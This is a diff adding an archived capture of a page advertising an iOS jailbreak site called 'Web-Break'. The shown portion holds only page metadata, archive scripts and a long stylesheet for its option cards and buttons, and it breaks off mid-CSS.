@@ -1,0 +1,3627 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script type="text/javascript" src="https://web-static.archive.org/_static/js/bundle-playback.js?v=2N_sDSC0" charset="utf-8"></script>
+<script type="text/javascript" src="https://web-static.archive.org/_static/js/wombat.js?v=o9P2E1FK" charset="utf-8"></script>
+<script>window.RufflePlayer=window.RufflePlayer||{};window.RufflePlayer.config={"autoplay":"on","unmuteOverlay":"hidden","showSwfDownload":true};</script>
+<script type="text/javascript" src="https://web-static.archive.org/_static/js/ruffle/ruffle.js"></script>
+<script type="text/javascript">
+    __wm.init("https://web.archive.org/web");
+  __wm.wombat("https://vityaig.github.io/26jailbreak.html","20260503211418","https://web.archive.org/","web","https://web-static.archive.org/_static/",
+	      "1777842858");
+</script>
+<link rel="stylesheet" type="text/css" href="https://web-static.archive.org/_static/css/banner-styles.css?v=1utQkbB3" />
+<link rel="stylesheet" type="text/css" href="https://web-static.archive.org/_static/css/iconochive.css?v=3PDvdIFv" />
+<!-- End Wayback Rewrite JS Include -->
+
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>(Web-Break)</title>
+  <meta name="description" content="Web-Break is a polished jailbreak experience for iOS 16 - iOS 26.5 with clear options and trusted tools. Made by @VityaV on Telegram">
+  <meta name="theme-color" content="#0b0b10">
+  <meta property="og:type" content="website">
+  <meta property="og:site_name" content="Web-Break">
+  <meta property="og:url" content="https://web.archive.org/web/20260503211418/https://vityaig.github.io/26jailbreak.html">
+  <meta property="og:title" content="Jailbreak for iOS 26">
+  <meta property="og:description" content="Web-Break is a polished jailbreak experience for iOS 16 - iOS 26.5 with clear options and trusted tools. Made by @VityaV on Telegram">
+  <meta property="og:image" content="https://web.archive.org/web/20260503211418im_/https://vityaig.github.io/embed-index.png">
+  <meta property="og:image:alt" content="Web-Break preview image">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Jailbreak for iOS 26">
+  <meta name="twitter:description" content="Web-Break is a polished jailbreak experience for iOS 16 - iOS 26.5 with clear options and trusted tools. Made by @VityaV on Telegram">
+  <meta name="twitter:image" content="https://web.archive.org/web/20260503211418im_/https://vityaig.github.io/embed-index.png">
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23ffffff' stroke-width='2.4' stroke-linecap='round' stroke-linejoin='round'%3E%3Crect x='5' y='11' width='14' height='9' rx='2'/%3E%3Cpath d='M8 11V8.5a4 4 0 0 1 8 0V11'/%3E%3C/svg%3E">
+  <script src="index.html"></script>
+  <script src="lucide@latest"></script>
+  
+  <style>
+    :root {
+      --bg-color: #000000;
+      --app-height: 100vh;
+      --category-sheen: rgba(255, 255, 255, 0.08);
+      --category-glow: rgba(34, 197, 94, 0.14);
+      --category-glow-soft: rgba(34, 197, 94, 0.05);
+    }
+    
+    body { 
+      background-color: var(--bg-color); 
+      color: white; 
+      margin: 0; 
+      overflow-x: hidden;
+      width: 100%;
+      min-height: var(--app-height);
+      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "SF Pro Text", "Helvetica Neue", ui-sans-serif, system-ui, sans-serif; 
+      -webkit-font-smoothing: antialiased;
+      text-rendering: optimizeLegibility;
+    }
+
+    body.modal-open {
+      overflow: hidden;
+    }
+
+    body.panic-active {
+      overflow: hidden;
+      background: #8b0000;
+    }
+
+    .panic-screen {
+      position: fixed;
+      inset: 0;
+      z-index: 100;
+      display: none;
+      flex-wrap: wrap;
+      align-content: flex-start;
+      gap: 4px;
+      padding: 0;
+      overflow: hidden;
+      background: #8b0000;
+      color: #ffffff;
+      font-family: 'JetBrains Mono', ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+      opacity: 0;
+      transform: scale(1.015);
+      transition: opacity 90ms linear, transform 180ms ease-out;
+      pointer-events: none;
+    }
+
+    .panic-screen.active {
+      display: flex;
+      opacity: 1;
+      transform: scale(1);
+    }
+
+    .panic-screen .error-msg {
+      position: relative;
+      z-index: 2;
+      padding: 1px;
+      font-size: 6px;
+      line-height: 1;
+      white-space: nowrap;
+      user-select: none;
+      opacity: 0.62;
+      text-shadow: 0 0 6px rgba(255, 255, 255, 0.18);
+    }
+
+    /* Animations */
+    @keyframes gradient {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+    .gradient-text {
+      background-size: 200% 200%;
+      animation: gradient 4s ease infinite;
+      background-image: linear-gradient(to right, #ffffff, #888888, #ffffff);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .hero-heading {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.85rem;
+      flex-wrap: nowrap;
+    }
+
+    .hero-logo-shell {
+      position: relative;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+
+    .hero-logo-glow {
+      position: absolute;
+      inset: -24%;
+      border-radius: 9999px;
+      pointer-events: none;
+      background:
+        radial-gradient(circle at center, rgba(255, 255, 255, 0.22) 0%, rgba(255, 255, 255, 0.12) 28%, rgba(255, 255, 255, 0.03) 54%, transparent 74%);
+      filter: blur(12px);
+      opacity: 0;
+      transform: scale(0.84);
+      animation: logoGlowReveal 1.1s cubic-bezier(0.22, 1, 0.36, 1) 0.08s forwards, logoGlowBreath 5.8s ease-in-out 1.2s infinite;
+    }
+
+    .hero-logo {
+      width: 3.35rem;
+      height: 3.35rem;
+      object-fit: contain;
+      flex-shrink: 0;
+      filter: drop-shadow(0 0 10px rgba(255,255,255,0.28));
+      image-rendering: auto;
+      opacity: 0;
+      transform: translateY(6px) scale(0.94);
+      animation: logoReveal 0.8s cubic-bezier(0.22, 1, 0.36, 1) 0.12s forwards;
+      pointer-events: none;
+      user-select: none;
+    }
+
+    .hero-title {
+      min-height: 1.12em;
+      white-space: nowrap;
+    }
+
+    .hero-title.typing::after {
+      content: '';
+      display: inline-block;
+      width: 0.08em;
+      height: 0.82em;
+      margin-left: 0.1em;
+      background: rgba(255,255,255,0.9);
+      vertical-align: -0.08em;
+      animation: cursorBlink 0.8s steps(1) infinite;
+      -webkit-text-fill-color: initial;
+    }
+
+    @keyframes logoReveal {
+      to {
+        opacity: 1;
+        transform: translateY(0) scale(1);
+      }
+    }
+
+    @keyframes logoGlowReveal {
+      to {
+        opacity: 0.88;
+        transform: scale(1);
+      }
+    }
+
+    @keyframes logoGlowBreath {
+      0%, 100% {
+        opacity: 0.54;
+        transform: scale(0.96);
+      }
+      50% {
+        opacity: 0.9;
+        transform: scale(1.06);
+      }
+    }
+
+    @keyframes cursorBlink {
+      50% { opacity: 0; }
+    }
+
+    #stars-canvas {
+      position: fixed;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 0;
+      display: block;
+      opacity: 0.42;
+      pointer-events: none;
+      contain: strict;
+      transform: translateZ(0);
+      transition: opacity 0.8s ease;
+    }
+
+    #stars-canvas.jb-active {
+      opacity: 0.56;
+    }
+
+    .low-perf .hero-logo,
+    .low-perf .option-item,
+    .low-perf #continue-btn,
+    .low-perf #main-jailbreak-btn,
+    .low-perf #lang-btn,
+    .low-perf #info-btn,
+    .low-perf #view-credits-btn,
+    .low-perf #info-content,
+    .low-perf #lang-content,
+    .low-perf #jb-selected-box {
+      backdrop-filter: none !important;
+      -webkit-backdrop-filter: none !important;
+      filter: none !important;
+    }
+
+    .low-perf .jb-pulse-waves span {
+      background: none;
+      box-shadow: none;
+    }
+
+    .low-perf .particle {
+      box-shadow: 0 0 8px currentColor;
+    }
+
+    .low-perf .hero-logo-glow {
+      filter: none;
+      box-shadow: none;
+    }
+
+    /* Transitions */
+    .fade-out {
+      animation: fadeOut 0.6s cubic-bezier(0.22, 1, 0.36, 1) forwards;
+    }
+    @keyframes fadeOut {
+      from { opacity: 1; filter: blur(0px); transform: translateY(0) scale(1); }
+      to { opacity: 0; filter: blur(8px); transform: translateY(-40px) scale(0.95); }
+    }
+
+    .no-scrollbar::-webkit-scrollbar { display: none; }
+    .no-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
+
+    #selection-screen {
+      position: relative;
+      min-height: var(--app-height);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      z-index: 10;
+      padding: 4rem 1.5rem;
+    }
+
+    #selection-screen::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      pointer-events: none;
+      background:
+        radial-gradient(60% 45% at 50% 14%, var(--category-glow) 0%, transparent 72%),
+        radial-gradient(42% 34% at 16% 72%, var(--category-glow-soft) 0%, transparent 78%),
+        radial-gradient(36% 30% at 84% 30%, var(--category-glow-soft) 0%, transparent 74%);
+      opacity: 1;
+      transition: opacity 0.45s ease, background 0.45s ease;
+      z-index: 0;
+    }
+
+    #jailbreak-screen {
+      position: fixed;
+      inset: 0;
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      z-index: 10;
+      opacity: 0;
+      transform: scale(0.9);
+      transition: all 0.8s cubic-bezier(0.22, 1, 0.36, 1);
+    }
+    #jailbreak-screen.active {
+      display: flex;
+      opacity: 1;
+      transform: scale(1);
+    }
+
+    #selection-screen,
+    #jailbreak-screen,
+    #info-modal,
+    #lang-modal {
+      isolation: isolate;
+    }
+
+    /* Option Button New Design: Sleek horizontal */
+    #options-list {
+      display: grid;
+      grid-template-columns: 1fr;
+      gap: 1rem;
+      width: 100%;
+      max-width: 32rem;
+      margin: 0 auto;
+    }
+
+    @media (min-width: 768px) {
+      #options-list {
+        grid-template-columns: repeat(2, 1fr);
+        max-width: 56rem;
+      }
+    }
+
+    @media (max-width: 767px) {
+      #options-list[data-category="icloud"] .option-title {
+        font-size: 1.1rem;
+      }
+
+      #options-list[data-category="icloud"] .option-desc {
+        font-size: 0.94rem;
+      }
+    }
+
+    .option-item {
+      position: relative;
+      display: flex;
+      align-items: center;
+      padding: 1.25rem 1.5rem;
+      border-radius: 1.25rem;
+      background: rgba(3, 3, 3, 0.64);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      backdrop-filter: blur(14px);
+      -webkit-backdrop-filter: blur(14px);
+      cursor: pointer;
+      transition: transform 0.4s cubic-bezier(0.22, 1, 0.36, 1), 
+                  background 0.4s ease, border-color 0.4s ease, 
+                  box-shadow 0.4s ease, opacity 0.4s ease, filter 0.4s ease;
+      overflow: hidden;
+      transform: translateZ(0); /* Fix for webkit white borders/bleeding on scale */
+      -webkit-mask-image: -webkit-radial-gradient(white, black);
+      outline: none;
+      -webkit-tap-highlight-color: transparent;
+      user-select: none;
+    }
+
+    .option-item:hover,
+    .option-item:focus-visible {
+      background: rgba(8, 8, 8, 0.78);
+      transform: scale(1.02);
+    }
+
+    .option-item:focus-visible {
+      box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.18);
+    }
+    
+    .option-item:active {
+      transform: scale(0.98);
+    }
+
+    .option-icon-wrapper {
+      flex-shrink: 0;
+      width: 3rem;
+      height: 3rem;
+      border-radius: 0.75rem;
+      display: grid;
+      place-items: center;
+      background: rgba(0, 0, 0, 0.38);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      margin-right: 1.25rem;
+      transition: all 0.4s ease;
+      color: rgba(255, 255, 255, 0.7);
+      overflow: hidden;
+    }
+
+    .option-icon-asset {
+      width: 100%;
+      height: 100%;
+      position: relative;
+      z-index: 10;
+      transition: opacity 0.3s ease;
+    }
+
+    .option-icon-wrapper img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      object-position: center;
+      display: block;
+      transform: none;
+    }
+
+    .option-icon-wrapper img.is-contained {
+      object-fit: contain;
+      padding: 0.18rem;
+      background: rgba(0, 0, 0, 0.16);
+      border-radius: 0.68rem;
+    }
+
+    .option-icon-wrapper img.is-contained.is-tight {
+      padding: 0.12rem;
+    }
+
+    .option-svg-icon {
+      width: 100%;
+      height: 100%;
+      display: block;
+      position: relative;
+      z-index: 10;
+      filter: drop-shadow(0 0 10px rgba(255, 255, 255, 0.12));
+    }
+
+    .option-svg-icon.is-icloud {
+      width: 100%;
+      height: 100%;
+    }
+
+    .option-item[data-id="roothide"] .option-icon-wrapper {
+      background: rgba(239, 68, 68, 0.14);
+      border: 1px solid rgba(239, 68, 68, 0.28);
+      color: #f87171;
+      box-shadow: inset 0 0 18px rgba(239, 68, 68, 0.08);
+    }
+
+    .option-item[data-id="roothide"] .option-icon-wrapper svg {
+      filter: drop-shadow(0 0 8px rgba(239, 68, 68, 0.45));
+    }
+
+    .option-content {
+      flex-grow: 1;
+      min-width: 0;
+      display: flex;
+      flex-direction: column;
+      z-index: 2;
+    }
+
+    .option-title {
+      font-size: 1.125rem;
+      font-weight: 600;
+      color: white;
+      transition: color 0.3s ease;
+      text-align: left;
+    }
+
+    .option-desc {
+      font-size: 0.875rem;
+      color: rgba(255, 255, 255, 0.5);
+      margin-top: 0.25rem;
+      transition: color 0.3s ease;
+      text-align: left;
+    }
+
+    #options-list[data-category="icloud"] .option-title {
+      font-size: 1.24rem;
+    }
+
+    #options-list[data-category="icloud"] .option-desc {
+      font-size: 1rem;
+      line-height: 1.52;
+      color: rgba(255, 255, 255, 0.64);
+    }
+
+    #options-list[data-category="icloud"] .option-icon-wrapper {
+      width: 3.35rem;
+      height: 3.35rem;
+      background: color-mix(in srgb, var(--theme-color, #ffffff) 14%, rgba(0, 0, 0, 0.38));
+      border-color: color-mix(in srgb, var(--theme-color, #ffffff) 32%, rgba(255, 255, 255, 0.08));
+      box-shadow: inset 0 0 18px color-mix(in srgb, var(--theme-color, #ffffff) 14%, transparent);
+    }
+
+    .desc-accent-purple {
+      color: #c4b5fd;
+      font-weight: 600;
+    }
+
+    .option-badge-row {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.35rem;
+      margin-top: 0.65rem;
+    }
+
+    .ios-availability-badge {
+      display: inline-flex;
+      align-items: center;
+      width: fit-content;
+      padding: 0.28rem 0.55rem;
+      border-radius: 9999px;
+      border: 1px solid rgba(34, 197, 94, 0.35);
+      background: rgba(34, 197, 94, 0.12);
+      color: #4ade80;
+      font-size: 0.68rem;
+      font-weight: 700;
+      line-height: 1;
+      box-shadow: 0 0 12px rgba(34, 197, 94, 0.12);
+      white-space: nowrap;
+    }
+
+    .recommendation-badge {
+      display: inline-flex;
+      align-items: center;
+      width: fit-content;
+      padding: 0.28rem 0.55rem;
+      border-radius: 9999px;
+      border: 1px solid rgba(255, 255, 255, 0.16);
+      background: rgba(255, 255, 255, 0.08);
+      color: rgba(255, 255, 255, 0.88);
+      font-size: 0.68rem;
+      font-weight: 700;
+      line-height: 1;
+      white-space: nowrap;
+      box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.06);
+    }
+
+    .recommendation-badge::before {
+      content: '';
+      width: 0.4rem;
+      height: 0.4rem;
+      border-radius: 9999px;
+      margin-right: 0.38rem;
+      background: var(--theme-color, #ffffff);
+      box-shadow: 0 0 12px var(--theme-color, #ffffff);
+    }
+
+    .exclusive-badge {
+      display: inline-flex;
+      align-items: center;
+      width: fit-content;
+      padding: 0.28rem 0.55rem;
+      border-radius: 9999px;
+      border: 1px solid rgba(251, 191, 36, 0.28);
+      background: rgba(251, 191, 36, 0.12);
+      color: #fcd34d;
+      font-size: 0.68rem;
+      font-weight: 700;
+      line-height: 1;
+      white-space: nowrap;
+      box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.04), 0 0 12px rgba(251, 191, 36, 0.08);
+    }
+
+    .exclusive-badge::before {
+      content: '';
+      width: 0.4rem;
+      height: 0.4rem;
+      border-radius: 9999px;
+      margin-right: 0.38rem;
+      background: #fcd34d;
+      box-shadow: 0 0 12px rgba(252, 211, 77, 0.7);
+    }
+
+    .option-item[data-id="dg_17_0"],
+    .option-item[data-id="dg_16_5_1"] {
+      border-color: rgba(251, 191, 36, 0.16);
+      background:
+        linear-gradient(135deg, rgba(251, 191, 36, 0.08), rgba(245, 158, 11, 0.04) 36%, rgba(120, 53, 15, 0.04) 100%),
+        rgba(3, 3, 3, 0.72);
+      box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.04);
+    }
+
+    .option-item[data-id="dg_17_0"] .option-icon-wrapper,
+    .option-item[data-id="dg_16_5_1"] .option-icon-wrapper {
+      background: linear-gradient(145deg, rgba(251, 191, 36, 0.18), rgba(217, 119, 6, 0.08));
+      border-color: rgba(251, 191, 36, 0.24);
+      color: #fcd34d;
+      box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.08), 0 0 18px rgba(251, 191, 36, 0.08);
+    }
+
+    .option-item[data-id="dg_17_0"] .option-glow,
+    .option-item[data-id="dg_16_5_1"] .option-glow {
+      background: radial-gradient(120% 100% at 0% 50%, rgba(251, 191, 36, 0.22) 0%, transparent 100%);
+    }
+
+    .option-radio {
+      flex-shrink: 0;
+      width: 1.5rem;
+      height: 1.5rem;
+      border-radius: 50%;
+      border: 2px solid rgba(255, 255, 255, 0.2);
+      margin-left: 1rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: all 0.3s ease;
+    }
+
+    .option-radio::after {
+      content: '';
+      width: 0.75rem;
+      height: 0.75rem;
+      border-radius: 50%;
+      background: transparent;
+      transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+      transform: scale(0);
+    }
+
+    .option-glow {
+      position: absolute;
+      inset: 0;
+      opacity: 0;
+      transition: opacity 0.5s ease;
+      background: radial-gradient(120% 100% at 0% 50%, var(--theme-color) 0%, transparent 100%);
+      z-index: 0;
+      pointer-events: none;
+    }
+
+    /* Selected State */
+    @keyframes selectPop {
+      0% {
+        transform: scale(0.98);
+      }
+      50% {
+        transform: scale(1.04);
+      }
+      100% {
+        transform: scale(1.02);
+      }
+    }
+
+    @keyframes particle-burst {
+      0% {
+        transform: translate(-50%, -50%) scale(1) rotate(0deg);
+        opacity: 1;
+      }
+      100% {
+        transform: translate(calc(-50% + var(--tx)), calc(-50% + var(--ty))) scale(0) rotate(var(--rot));
+        opacity: 0;
+      }
+    }
+
+    .particle {
+      position: fixed;
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      pointer-events: none;
+      z-index: 9999;
+      animation: particle-burst 0.6s cubic-bezier(0, 0.55, 0.45, 1) forwards;
+      color: var(--theme-color);
+      box-shadow: 0 0 10px currentColor, 0 0 20px currentColor;
+    }
+
+
+    .option-item.selected {
+      border-color: var(--theme-color);
+      background: rgba(3, 3, 3, 0.78);
+      transform: scale(1.02);
+      box-shadow: 0 12px 34px -18px var(--theme-color), inset 0 0 0 1px rgba(0, 0, 0, 0.5);
+      animation: selectPop 0.5s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
+    }
+
+    #options-list:has(.option-item.selected) .option-item:not(.selected) {
+      opacity: 0.5;
+      transform: scale(0.96);
+      filter: grayscale(0.7);
+    }
+
+    #options-list.has-selection .option-item:not(.selected) {
+      opacity: 0.5;
+      transform: scale(0.96);
+      filter: grayscale(0.7);
+    }
+
+    .option-item.selected .option-glow {
+      opacity: 0.1;
+    }
+
+    .option-item.selected .option-icon-wrapper {
+      background: var(--theme-color);
+      color: white;
+      box-shadow: 0 0 20px 0 var(--theme-color);
+    }
+
+    .option-item.selected .option-title {
+      color: white;
+    }
+    
+    .option-item.selected .option-desc {
+      color: rgba(255, 255, 255, 0.8);
+    }
+
+    .option-item.selected .option-radio {
+      border-color: var(--theme-color);
+    }
+
+    .option-item.selected .option-radio::after {
+      background: var(--theme-color);
+      transform: scale(1);
+    }
+
+    /* Continue Button */
+    #continue-btn-container {
+      opacity: 0;
+      transform: translateY(20px);
+      pointer-events: none;
+      transition: all 0.5s cubic-bezier(0.22, 1, 0.36, 1);
+      margin-top: 2.5rem;
+      width: 100%;
+      max-width: 32rem;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    @media (min-width: 768px) {
+      #continue-btn-container {
+        max-width: 56rem;
+      }
+    }
+    
+    #continue-btn-container.visible {
+      opacity: 1;
+      transform: translateY(0);
+      pointer-events: auto;
+    }
+
+    .step-indicator {
+      position: relative;
+      z-index: 2;
+      display: inline-flex;
+      align-items: center;
+      gap: 0.65rem;
+      padding: 0.45rem 0.65rem;
+      border-radius: 9999px;
+      background: rgba(255, 255, 255, 0.04);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.04);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+    }
+
+    .step-chip {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.55rem;
+      min-height: 2rem;
+      padding: 0.38rem 0.85rem;
+      border-radius: 9999px;
+      color: rgba(255, 255, 255, 0.56);
+      transition: background 0.28s ease, color 0.28s ease, transform 0.28s ease, box-shadow 0.28s ease;
+    }
+
+    .step-chip.is-active {
+      color: rgba(255, 255, 255, 0.98);
+      background: rgba(255, 255, 255, 0.1);
+      box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.08), 0 10px 24px -20px rgba(255, 255, 255, 0.35);
+      transform: translateY(-1px);
+    }
+
+    .step-dot {
+      width: 0.52rem;
+      height: 0.52rem;
+      border-radius: 9999px;
+      background: rgba(255, 255, 255, 0.18);
+      box-shadow: 0 0 0 1px rgba(255, 255, 255, 0.05);
+      transition: background 0.28s ease, box-shadow 0.28s ease, transform 0.28s ease;
+    }
+
+    .step-chip.is-active .step-dot {
+      background: var(--theme-color, #ffffff);
+      box-shadow: 0 0 14px var(--theme-color, #ffffff);
+      transform: scale(1.08);
+    }
+
+    .step-label {
+      font-size: 0.72rem;
+      font-weight: 700;
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
+      white-space: nowrap;
+    }
+
+    .step-divider {
+      width: 1.15rem;
+      height: 1px;
+      background: rgba(255, 255, 255, 0.14);
+    }
+
+    #continue-btn {
+      width: 100%;
+      min-height: 4rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.5rem;
+      padding: 1.25rem 2rem;
+      background: rgba(4, 4, 4, 0.86);
+      color: white;
+      border-radius: 1rem;
+      font-weight: 700;
+      font-size: 1.125rem;
+      line-height: 1.1;
+      text-align: center;
+      transition: all 0.3s ease;
+      cursor: pointer;
+      border: 1px solid rgba(255, 255, 255, 0.12);
+      box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.06), 0 16px 32px -24px rgba(255, 255, 255, 0.45);
+      backdrop-filter: blur(14px);
+      -webkit-backdrop-filter: blur(14px);
+    }
+
+    #continue-btn:focus-visible,
+    #main-jailbreak-btn:focus-visible,
+    #lang-btn:focus-visible,
+    #info-btn:focus-visible {
+      outline: 2px solid rgba(255, 255, 255, 0.5);
+      outline-offset: 3px;
+    }
+
+    #continue-btn:hover {
+      transform: translateY(-2px);
+      background: rgba(10, 10, 10, 0.94);
+      box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.08), 0 18px 34px -22px rgba(255, 255, 255, 0.45);
+    }
+    
+    #continue-btn:active {
+      transform: translateY(0);
+    }
+
+    /* Jailbreak Button */
+    #jb-btn-wrapper {
+      position: relative;
+      display: inline-flex;
+      width: auto;
+      max-width: calc(100vw - 2rem);
+      transform: translateZ(0);
+      border-radius: 9999px;
+      transition: transform 0.28s cubic-bezier(0.22, 1, 0.36, 1), box-shadow 0.28s ease;
+      will-change: transform;
+      contain: layout;
+    }
+
+    #lang-btn,
+    #info-btn {
+      flex-shrink: 0;
+    }
+
+    #jb-selected-value {
+      width: 100%;
+      min-width: 0;
+      justify-content: center;
+    }
+
+    #jb-btn-wrapper:hover {
+      transform: translateZ(0) scale(1.05);
+      box-shadow: 0 0 30px 0 var(--theme-color, rgba(255,255,255,0.3));
+    }
+
+    #jb-btn-wrapper:active {
+      transform: translateZ(0) scale(1.08) !important;
+      transition: transform 0.1s cubic-bezier(0.22, 1, 0.36, 1) !important;
+    }
+
+    .jb-orbit-ring {
+      position: absolute;
+      inset: -14px;
+      width: calc(100% + 28px);
+      height: calc(100% + 28px);
+      display: none;
+      pointer-events: none;
+      overflow: visible;
+      opacity: 0.95;
+      filter: drop-shadow(0 0 8px rgba(34, 197, 94, 0.75)) drop-shadow(0 0 18px rgba(5, 150, 105, 0.35));
+      transform: translateZ(0);
+    }
+
+    .jb-orbit-track,
+    .jb-orbit-line {
+      fill: none;
+      vector-effect: non-scaling-stroke;
+    }
+
+    .jb-pulse-waves {
+      position: absolute;
+      inset: -16px;
+      z-index: 1;
+      pointer-events: none;
+      border-radius: 9999px;
+    }
+
+    .jb-button-halo {
+      position: absolute;
+      inset: -26px;
+      z-index: 0;
+      pointer-events: none;
+      border-radius: 9999px;
+      background:
+        radial-gradient(ellipse at center, rgba(var(--theme-rgb, 34, 197, 94), 0.34) 0%, rgba(var(--theme-rgb, 34, 197, 94), 0.18) 32%, rgba(var(--theme-rgb, 34, 197, 94), 0.06) 56%, transparent 78%);
+      filter: blur(18px);
+      opacity: 0.42;
+      transform: scale(0.92);
+      animation: button-halo-breathe 4.8s ease-in-out infinite;
+    }
+
+    .jb-pulse-waves span {
+      position: absolute;
+      inset: 0;
+      border-radius: inherit;
+      border: 1px solid rgba(var(--theme-rgb, 34, 197, 94), 0.55);
+      background: radial-gradient(closest-side, rgba(var(--theme-rgb, 34, 197, 94), 0.12), transparent 72%);
+      box-shadow: 0 0 16px rgba(var(--theme-rgb, 34, 197, 94), 0.28), inset 0 0 18px rgba(var(--theme-rgb, 34, 197, 94), 0.1);
+      opacity: 0;
+      transform: scale(0.92);
+      animation: pulse-wave 3.2s cubic-bezier(0.22, 1, 0.36, 1) infinite;
+    }
+
+    .jb-pulse-waves span:nth-child(2) {
+      animation-delay: 0.8s;
+    }
+
+    .jb-pulse-waves span:nth-child(3) {
+      animation-delay: 1.6s;
+    }
+
+    @keyframes pulse-wave {
+      0% {
+        opacity: 0;
+        transform: scale(0.9);
+      }
+      18% {
+        opacity: 0.42;
+      }
+      72% {
+        opacity: 0;
+        transform: scale(1.42);
+      }
+      100% {
+        opacity: 0;
+        transform: scale(1.42);
+      }
+    }
+
+    @keyframes button-halo-breathe {
+      0%, 100% {
+        opacity: 0.3;
+        transform: scale(0.9);
+      }
+      50% {
+        opacity: 0.62;
+        transform: scale(1.08);
+      }
+    }
+
+    .jb-orbit-track {
+      stroke: rgba(34, 197, 94, 0.18);
+      stroke-width: 2;
+    }
+
+    .jb-orbit-line {
+      stroke: url(26jailbreak.html);
+      stroke-width: 3;
+      stroke-linecap: round;
+      stroke-dasharray: 18 82;
+      animation: orbit-line 2.2s linear infinite, orbit-pulse 3.4s ease-in-out infinite;
+      will-change: stroke-dashoffset;
+    }
+
+    @keyframes orbit-line {
+      to { stroke-dashoffset: -100; }
+    }
+
+    @keyframes orbit-pulse {
+      0%, 100% {
+        opacity: 0.72;
+        stroke-width: 2.5;
+      }
+      50% {
+        opacity: 1;
+        stroke-width: 3.8;
+      }
+    }
+
+    #main-jailbreak-btn {
+      position: relative;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: auto;
+      max-width: 100%;
+      padding: 1.5rem 4rem;
+      background-color: transparent;
+      color: white;
+      border-radius: 9999px;
+      border: 1px solid rgba(255,255,255,0.2);
+      font-weight: 800;
+      font-size: 2.2rem;
+      letter-spacing: 0.1em;
+      line-height: 1.1;
+      text-align: center;
+      transition: all 0.3s cubic-bezier(0.22, 1, 0.36, 1);
+      cursor: pointer;
+      overflow: hidden;
+      -webkit-tap-highlight-color: transparent;
+      outline: none;
+      transform: translateZ(0);
+      z-index: 10;
+      will-change: transform;
+    }
+
+    #main-jailbreak-btn::after {
+      content: '';
+      position: absolute;
+      inset: 0;
+      border-radius: inherit;
+      padding: 2px;
+      pointer-events: none;
+      z-index: 1;
+      background: linear-gradient(90deg, var(--accent-deep, #052e16), var(--accent-dark, #16a34a), var(--theme-color, #22c55e), var(--accent-soft, #bbf7d0), var(--theme-color, #22c55e), var(--accent-deep, #064e3b));
+      background-size: 260% 100%;
+      box-shadow: inset 0 0 10px rgba(var(--theme-rgb, 34, 197, 94), 0.22), 0 0 10px rgba(var(--theme-rgb, 34, 197, 94), 0.34);
+      animation: button-border-flow 3.2s linear infinite;
+      -webkit-mask: linear-gradient(#000 0 0) content-box, linear-gradient(#000 0 0);
+      -webkit-mask-composite: xor;
+      mask-composite: exclude;
+    }
+
+    @keyframes button-border-flow {
+      to { background-position: 260% 0; }
+    }
+
+    @media (max-width: 640px) {
+      #selection-screen {
+        justify-content: flex-start;
+        padding-top: 6rem;
+        padding-bottom: 2rem;
+      }
+
+      .hero-heading {
+        gap: 0.55rem;
+      }
+
+      .hero-logo {
+        width: 2.65rem;
+        height: 2.65rem;
+      }
+
+      .hero-logo-glow {
+        inset: -20%;
+      }
+
+      .option-item {
+        padding: 1rem;
+        border-radius: 1rem;
+      }
+
+      .option-icon-wrapper {
+        width: 2.75rem;
+        height: 2.75rem;
+        margin-right: 1rem;
+      }
+
+      .option-title {
+        font-size: 1rem;
+      }
+
+      .option-desc {
+        font-size: 0.8125rem;
+      }
+
+      .option-radio {
+        width: 1.25rem;
+        height: 1.25rem;
+        margin-left: 0.75rem;
+      }
+
+      #main-jailbreak-btn {
+        padding: 1.25rem 3rem;
+        font-size: 1.7rem;
+      }
+
+      .jb-orbit-ring {
+        inset: -12px;
+        width: calc(100% + 24px);
+        height: calc(100% + 24px);
+      }
+
+      .jb-pulse-waves {
+        inset: -12px;
+      }
+
+      .jb-button-halo {
+        inset: -18px;
+      }
+    }
+
+    #main-jailbreak-btn::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: white;
+      border-radius: inherit;
+      opacity: 0;
+      transition: opacity 0.3s ease;
+      z-index: 0;
